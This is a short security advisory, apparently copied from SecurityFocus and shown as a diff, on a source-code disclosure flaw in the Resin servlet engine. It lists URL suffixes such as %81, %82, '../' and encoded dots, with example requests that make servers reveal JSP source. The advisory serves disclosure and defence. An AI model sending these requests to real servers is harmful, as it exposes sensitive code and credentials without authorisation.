@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/1986/info
+
+Resin is a servlet and JSP engine that supports java and javascript.
+
+ServletExec will return the source code of JSP files when an HTTP request is appended with certain characters. This vulnerability is dependent on the platform that Resin is running on.
+
+Successful exploitation could lead to the disclosure of sensitive information contained within JSP pages.
+
+
+Apache (Win32):
+..
+%2e..
+%81
+%82
+Example: http://target/filename.jsp%81
+
+Resin Web Server:
+../
+Example: http://target/filename.jsp../
+
+
+IIS 5 requesting the URL encoded with ASCII:
+'%2' instead of '.'
+Example: http://target/filename%2ejsp 
